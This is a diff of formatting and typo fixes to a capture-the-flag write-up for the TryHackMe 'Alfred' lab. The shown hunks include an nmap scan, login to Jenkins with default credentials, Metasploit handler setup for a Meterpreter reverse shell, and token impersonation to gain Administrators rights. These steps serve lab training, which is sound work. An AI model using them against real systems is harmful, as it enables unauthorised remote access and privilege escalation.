@@ -13,6 +13,7 @@ Please note that this machine does not respond to ping (ICMP) and may take a few
 ### Recon 
 #### NMAP Scan
 
+```bash
 Nmap 7.80 scan initiated Sun Apr 24 12:24:54 2022 as: nmap -p- -Pn -T5 -oN nmap.initial 10.10.2.139
 Nmap scan report for 10.10.2.139
 Host is up (0.088s latency).
@@ -23,11 +24,12 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 Nmap done at Sun Apr 24 12:27:40 2022 -- 1 IP address (1 host up) scanned in 165.74 seconds
+```
 
 *Question 1: How many ports are open? (TCP only)* 3
-**Port 80** - Web server showing photo and email address of Alfred.
-**Port 3389** - Windows RDP Protocol.
-**Port 8080** - Login page for Jenkins. No usefull info on page or in source code. But the site does use a script ([j_acegi_security_check](view-source:http://10.10.5.252:8080/j_acegi_security_check)) for security.
+* **Port 80** - Web server showing photo and email address of Alfred.
+* **Port 3389** - Windows RDP Protocol.
+* **Port 8080** - Login page for Jenkins. No usefull info on page or in source code. But the site does use a script ([j_acegi_security_check](view-source:http://10.10.5.252:8080/j_acegi_security_check)) for security.
 
 I was going to use BurpSuite and/or Hydra to try brute-forcing the user:password. Before that I tried a few of the basic default combinations. I was pleasantly suprised, when one of them worked. 
 
@@ -79,7 +81,7 @@ PS C:\Program Files (x86)\Jenkins\workspace\project>
 
 Look around for passwords, credentials, and flags.
 ```powershell
-PS C:\Program Files (x86)\Jenkins\workspace\project>dir
+PS C:\Program Files (x86)\Jenkins\workspace\project> dir
 PS C:\Program Files (x86)\Jenkins\workspace\project> ls
 PS C:\Program Files (x86)\Jenkins\workspace\project> cd ..
 PS C:\Program Files (x86)\Jenkins\workspace> dir
@@ -258,17 +260,17 @@ Mode                LastWriteTime     Length Name
 ```bash
 ┌──(bradley㉿kali)-[~/THM/Alfred]
 └─$ msfconsole
-msf6> use exploit/multi/handler
-msf6> set PAYLOAD windows/meterpreter/reverse_tcp
-msf6> set LHOST <my-ip>
-msf6> set LPORT 5555
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 > set LHOST <my-ip>
+msf6 > set LPORT 5555
 ```
 
 NOTE the LPORT must match the port used when generating the payload in msfvenom. 
 
 * Now run the listener.
 ```bash
-msf6> exploit
+msf6 > exploit
 listening prompt.
 ```
 
@@ -378,7 +380,7 @@ meterpreter > load incognito
 
 To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available. Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators token.
 
-* In the Metasploit trminal tab enter `list_tokens -g`.
+* In the Metasploit terminal tab enter `list_tokens -g`.
 ```bash
 meterpreter > list_tokens -g
 [Listing REDACTED]
